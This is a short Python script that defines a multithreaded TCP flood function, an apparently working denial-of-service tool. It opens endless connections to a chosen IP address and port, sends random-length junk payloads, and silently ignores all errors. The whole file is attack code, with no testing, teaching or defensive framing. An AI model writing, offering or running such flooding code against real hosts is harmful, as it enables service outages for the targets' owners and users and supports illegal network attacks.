import socket
import threading
import random
import time

def tcp_flood(target_ip, target_port, thread_count, delay):
    def flood():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, target_port))
                payload = "X" * random.randint(1024,4096)
                s.send(payload.encode())
                s.close()
            except:
                pass
            time.sleep(delay)

    for i in range(thread_count):
        t = threading.Thread(target=flood, daemon=True)
        t.start()
        print(f"[TCP FLOOD] Thread {i+1} started")

    print("[TCP FLOOD] Running... press Ctrl+C to stop")
    while True:
        time.sleep(1)
      
